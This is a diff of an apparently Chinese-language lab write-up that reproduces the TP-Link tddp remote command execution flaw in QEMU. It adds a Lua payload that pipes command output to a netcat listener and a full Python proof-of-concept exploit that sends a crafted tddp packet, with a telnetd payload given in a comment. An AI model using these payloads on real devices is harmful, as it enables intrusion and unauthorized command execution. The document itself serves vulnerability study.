@@ -127,49 +127,112 @@ Enter 'help' for a list of built-in commands.
 然后宿主机中安装ftp服务器：
 
 ```text
-sudo apt install atftpd
+sudo apt install tftpd-hpa
 ```
 
 配置ftp服务：
 
 ```text
-vim /etc/default/atftpd
-# 修改USE_INETD=true 改为 USE_INETD=false
-# 修改修改/srv/tftp为相应的ftp目录，我这里为/opt/ftp
+# /etc/default/tftpd-hpa
+
+TFTP_USERNAME="tftp"
+TFTP_DIRECTORY="/tftpboot"
+TFTP_ADDRESS=":69"
+TFTP_OPTIONS="--secure"
 ```
 
 配置目录
 
 ```text
-sudo mkdir /opt/ftp_dir
-sudo chmod 777 /opt/ftp_dir
+sudo mkdir /tftproot
+sudo chmod 777 /tftproot
 ```
 
 启动服务
 
 ```text
-sudo systemctl start atftpd
+sudo service tftpd-hpa start
 ```
-
-使用`sudo systemctl status atftpd`可查看服务状态。如果执行命令 `sudo systemctl status atftpd` 查看 atftpd 服务状态时，提示 `atftpd: can't bind port :69/udp` 无法绑定端口，可以执行 `sudo systemctl stop inetutils-inetd.service` 停用 `inetutils-inetd` 服务后，再执行 `sudo systemctl restart atftpd` 重新启动 atftpd 即可正常运行 atftpd。
 
 ### 实际展示
 
 前面都是准备环境的环节，接着就是复现漏洞的真正操作部分了。
 
-首先是往ftp服务器的目录中写入payload文件，文件需由lua语言编写，且包含`config_test`函数，实现功能可以随意，此处使用nc连接。
+重现步骤为：
+
+1. QEMU 虚拟机中启动 tddp 程序
+2. 宿主机使用 NC 监听端口
+3. 执行 POC，获取命令执行结果
+
+在 atftp 的根目录 `/tftpboot` 下写入 payload 文件  
+payload 文件内容为：
 
 ```text
 function config_test(config)
-  os.execute("whoami | nc  10.10.10.1 7777")
+  os.execute("id | nc 10.10.10.1 1337")
 end
 ```
 
-接着在虚拟机中启动tddp程序。
 
-然后在宿主机中监听7777端口。
+
+![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20190903105933851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzgwNTQ5,size_16,color_FFFFFF,t_70)
+
+接着在qemu虚拟机中启动tddp程序。
+
+![](../../.gitbook/assets/image%20%28100%29.png)
+
+然后在宿主机中监听1337端口。
+
+![](../../.gitbook/assets/image%20%28102%29.png)
 
 最后执行poc，就可以看到nc连回的结果了，我后面使用pwntools重写了之前的poc，因此这里就不贴出poc了，在后面再给出链接。
+
+![](../../.gitbook/assets/image%20%28101%29.png)
+
+```python
+#!/usr/bin/python3
+
+# Copyright 2019 Google LLC.
+# SPDX-License-Identifier: Apache-2.0
+
+# Create a file in your tftp directory with the following contents:
+#
+#function config_test(config)
+#  os.execute("telnetd -l /bin/login.sh")
+#end
+#
+# Execute script as poc.py remoteaddr filename
+
+import sys
+import binascii
+import socket
+
+port_send = 1040
+port_receive = 61000
+
+tddp_ver = "01"
+tddp_command = "31"
+tddp_req = "01"
+tddp_reply = "00"
+tddp_padding = "%0.16X" % 00
+
+tddp_packet = "".join([tddp_ver, tddp_command, tddp_req, tddp_reply, tddp_padding])
+
+sock_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock_receive.bind(('', port_receive))
+
+# Send a request
+sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+packet = binascii.unhexlify(tddp_packet)
+argument = "%s;arbitrary" % sys.argv[2]
+packet = packet + argument.encode()
+sock_send.sendto(packet, (sys.argv[1], port_send))
+sock_send.close()
+
+response, addr = sock_receive.recvfrom(1024)
+r = response.encode('hex')
+print(r)
+```
 
 ### 漏洞分析 <a id="toc-4"></a>
 
